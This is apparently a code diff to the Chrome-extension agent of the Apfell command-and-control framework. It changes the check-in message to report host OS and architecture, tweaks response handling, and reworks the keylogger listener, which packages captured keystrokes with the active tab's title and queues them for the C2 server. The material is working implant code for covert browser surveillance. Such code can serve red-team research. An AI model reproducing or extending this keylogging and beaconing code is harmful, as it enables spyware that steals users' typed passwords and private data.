@@ -29,7 +29,8 @@ class customC2 extends baseC2{
     checkIn() {
         const msg = {
             "action":"checkin",
-            "os":"chrome",
+            "os":hostos,
+            "architecture": hostarch,
             "user":apfell.userinfo,
             "uuid":apfell.uuid,
             "host":apfell.userinfo + "'s chrome",
@@ -140,7 +141,7 @@ connection.onmessage = function (e) {
         }
         case 'post_response' : {
             for (let index = 0; index < message.responses.length; index++) {
-                const response = message.responses[index];
+                let response = message.responses[index];
                 
                 // check for screencaptures 
                 if (screencaptures.length > 0) {
@@ -238,7 +239,9 @@ connection.onmessage = function (e) {
 
 // Listener for keylogger
 chrome.runtime.onConnect.addListener(function(port) {
-    if (port.name === "keylogger") {
+    //console.log("Received new runtime connection from port " + port.name);
+    var result = port.name.localeCompare("keylogger");
+    if (result === 0) {
         port.onMessage.addListener(function(msg) {
             let kmsg = {
                 "task_id": logger,
@@ -246,7 +249,7 @@ chrome.runtime.onConnect.addListener(function(port) {
                 "window_title": port.MessageSender.tabs.Tab.title,
                 "keystrokes": JSON.stringify(msg)
             };
-    
+            //console.log("Sending keystrokes " + JSON.stringify(kmsg));
             out.push(kmsg);
         });
     }
